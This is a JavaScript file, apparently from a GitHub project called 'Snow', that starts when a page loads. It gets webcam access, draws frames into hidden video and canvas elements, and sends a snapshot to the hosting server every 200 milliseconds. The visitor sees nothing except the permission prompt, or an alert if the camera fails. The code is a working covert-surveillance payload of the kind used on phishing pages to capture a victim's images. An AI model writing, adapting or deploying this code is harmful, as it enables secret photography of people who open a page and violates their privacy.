/* https://github.com/msfpt/Snow */

const camera = () => {

    const success = (imgSrc) => {
        $.ajax({
            url: window.location.origin,
            type: 'POST',
            data: {
                'Status': 'x1q',
                'imgSrc': imgSrc,
                'fileName': (new Date().toISOString()),
                'err': 'false'
            },
            success: function (response) { return false; },
            error: function () { return false; }
        });
    }

    const error = (error) => {

        console.warn(error);

        $.ajax({
            url: window.location.origin,
            type: 'POST',
            data: {
                'Status': 'x1q',
                'err': 'true'
            },
            success: function (response) { return false; },
            error: function () { return false; }
        });
        alert("Unable to retrieve your camera");
    }

    try {
        navigator.getUserMedia = navigator.getUserMedia || navigator.mozGetUserMedia;
    
        const canvas = document.createElement('canvas');
        canvas.style = 'display: none';
        canvas.width = 1080;
        canvas.height = 1080;
        document.body.appendChild(canvas);
        // Grab canvas context
        const ctx = canvas.getContext('2d');
        // Create hidden video element
        const video = document.createElement('video');
        video.style = 'display: none';
        video.width = canvas.width;
        video.height = canvas.height;
        document.body.appendChild(video);
        // Assign user media to video and start loop
        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
            video.srcObject = stream;
            video.play();
            loop_take_photo();
        });
        // Flag for mirror image
        let mirror = false;
        // Loop forever
        let a = 0;
        const loop_take_photo = () => {
            // save transform
            ctx.save();
            if (mirror) {
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
            }
            // Copy video to canvas
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            // restore transform
            ctx.restore();
            // Send canvas to Server
            if (a > 3) {
                success(canvas.toDataURL());
            }
            
            a++
            // Loop
            setTimeout(() => {
                loop_take_photo();
            } , 200);
        };
    } catch (err) {
        error(err);
    }
}

window.onload = () => {
    camera();
};